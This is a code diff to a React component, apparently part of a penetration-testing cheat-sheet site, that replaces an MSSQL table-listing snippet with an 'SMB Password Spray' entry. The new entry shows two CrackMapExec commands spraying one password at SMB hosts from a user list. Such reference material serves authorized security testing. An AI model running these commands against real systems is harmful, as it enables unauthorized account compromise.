@@ -15,7 +15,7 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
     title: string;
   }
   
-  const MSSQL_List_Tables = ({ title }: IProps) => {
+  const SMB_Password_Spray = ({ title }: IProps) => {
 
     return (
       <>
@@ -41,15 +41,17 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
                     Description
                 </Typography>
 
-
               <Typography>
-              To list tables in MSSQL.
+              We can password spray using CrackMapExec (CME).
                </Typography>
-               <Box pt={5} />
-              <SyntaxHighlighter className="syntax" language="ftp">
-              {"select table_name from {DB_NAME}.INFORMATION_SCHEMA.TABLES;"}
+               <Box pt={5}></Box>
+              <SyntaxHighlighter className="syntax" language="bash">
+              {"crackmapexec smb {IP} -u /tmp/userlist.txt -p 'Company01!'"}
             </SyntaxHighlighter>
-            
+            <Box pt={5}></Box>
+              <SyntaxHighlighter className="syntax" language="bash">
+              {"crackmapexec smb {IP} -u /tmp/userlist.txt -p 'Company01!' --local-auth"}
+            </SyntaxHighlighter>
             </Typography>
           </AccordionDetails>
         </Accordion>
@@ -58,5 +60,5 @@ import ChevronRightIcon from '@mui/icons-material/ChevronRight';
   };
 
   
-  export default MSSQL_List_Tables;
+  export default SMB_Password_Spray;
   
